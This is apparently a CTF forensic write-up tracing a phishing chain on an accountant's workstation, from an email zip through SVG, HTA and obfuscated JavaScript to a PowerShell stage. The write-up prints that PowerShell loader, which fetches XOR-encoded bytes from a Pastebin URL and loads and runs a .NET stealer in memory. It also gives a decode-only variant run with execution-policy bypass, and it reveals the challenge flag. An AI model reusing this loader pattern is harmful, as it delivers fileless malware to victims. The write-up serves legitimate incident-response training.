# [Forensic]NostalgiaS

The CIRT received an IR request from FAIZ Company regarding their accountant, Mr. Kadoya. Threat Intelligence reported that his sensitive data was exfiltrated and sold on the black market. Digital evidence from his workstation was collected for analysis. Examine it to determine the scope, impact, and root cause of the compromise.

The challenge provided `challenge.zip`, extracted we got `.ad1` file. Overall, we have find out flag from this `.ad1` file.

## Solution

Using FTK Imager, navigate to `Users\kadoya\...\Outlook`. Here we got mail that kadoya received, that mail contain a file `Moly.zip` which is probably a dangerous file and the password for unzip is `playmoly2025`.

Unzip, we had `playmoly.svg`, I got rick rolled here and forced to learn Trình. Nevermind, just view the source and we can see a link for downloading `FlashInstaller.hta`. Follow up the URL, we navigate to `something.txt`, it contains the obfuscated JavaScript code using `obfuscator.io`. Just deobfuscate it, and continue naviagate to `secr3t.txt` URL, using Cyberchef to decode from Base64 and we got a script

```shell
$AssemblyUrl = "https://pastebin.com/raw/90qeYSHA"
$XorKey = 0x24
$TypeName = "StealerJanai.core.RiderKick"
$MethodName = "Run"

try {
    $WebClient = New-Object System.Net.WebClient
    $encodedContent = $WebClient.DownloadString($AssemblyUrl)
    $WebClient.Dispose()

    $hexValues = $encodedContent.Trim() -split ',' | Where-Object { $_ -match '^0x[0-9A-Fa-f]+$' }

    $encodedBytes = New-Object byte[] $hexValues.Length
    for ($i = 0; $i -lt $hexValues.Length; $i++) {
        $encodedBytes[$i] = [Convert]::ToByte($hexValues[$i].Trim(), 16)
    }

    $originalBytes = New-Object byte[] $encodedBytes.Length
    for ($i = 0; $i -lt $encodedBytes.Length; $i++) {
        $originalBytes[$i] = $encodedBytes[$i] -bxor $XorKey
    }

    $assembly = [System.Reflection.Assembly]::Load($originalBytes)

    if ($TypeName -ne "" -and $MethodName -ne "") {
        $targetType = $assembly.GetType($TypeName)
        $methodInfo = $targetType.GetMethod(
            $MethodName,
            [System.Reflection.BindingFlags]::Static -bor [System.Reflection.BindingFlags]::Public
        )
        $methodInfo.Invoke($null, $null)
    }

} catch {
    exit 1
}
```

This script will get encrypted hex data from Pastebin, decode it and run on victim. This script is extracted from it but removed the running part (only decoding part is remained)

```powershell
$AssemblyUrl = "https://pastebin.com/raw/90qeYSHA"
$XorKey = 0x24
$out = Join-Path $PSScriptRoot "payload_decoded.bin"

try {
    $wc = New-Object System.Net.WebClient
    $raw = $wc.DownloadString($AssemblyUrl)
} finally {
    if ($wc) { $wc.Dispose() }
}

$hex = $raw.Trim() -split ',' | Where-Object { $_ -match '^\s*0x[0-9A-Fa-f]{1,2}\s*$' } |
       ForEach-Object { $_.Trim() }

[byte[]]$enc = New-Object byte[] $hex.Count
for ($i=0; $i -lt $hex.Count; $i++) {
    $enc[$i] = [Convert]::ToByte($hex[$i], 16)
}

[byte[]]$dec = New-Object byte[] $enc.Length
for ($i=0; $i -lt $enc.Length; $i++) {
    $dec[$i] = $enc[$i] -bxor $XorKey
}

[System.IO.File]::WriteAllBytes($out, $dec)
Write-Host "[+] Decoded to: $out"

Get-FileHash $out -Algorithm SHA256 | Format-List
"{0} bytes" -f $dec.Length
($dec[0..([Math]::Min(63,$dec.Length-1))] | ForEach-Object { "{0:X2}" -f $_ }) -join ' '
```

Usage

```shell
powershell -NoProfile -ExecutionPolicy Bypass -File .\DecodeOnly-Pastebin.ps1
```

Finally we got a file which is written using .NET, we use dnSpy to decompile

![](https://blog.kakaocdn.net/dna/z1JYm/dJMb9OAHfaI/AAAAAAAAAAAAAAAAAAAAAHAeBcX73PFCA8FDddPJ6SwU-gSjm_bYhZeXWXWdvN-8/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1761922799&allow_ip=&allow_referer=&signature=xDvDbaPshWlt6LYzeNELQYv%2F1Ic%3D)

Using reverse skill, we got a flag holder

```
CSCV2025{your_computer_<Machine Name>_has_be3n_kicked_by<Registry Value>}
```

Now just find out what is <Machine Name> and <Registry Value>. From the C# code we know that it will read from `SOFTWARE\\hensh1n`. Using Registry Viewer to view the `NTUSER.dat`. The <Registry Value> must be `HxrYJgdu`

For the <Machine Name>, just view in `System32\SYSTEM`: `DESKTOP-47ICHL6`

## Craft the flag

**Flag:** CSCV2025{your_computer_DESKTOP-47ICHL6_has_be3n_kicked_byHxrYJgdu}
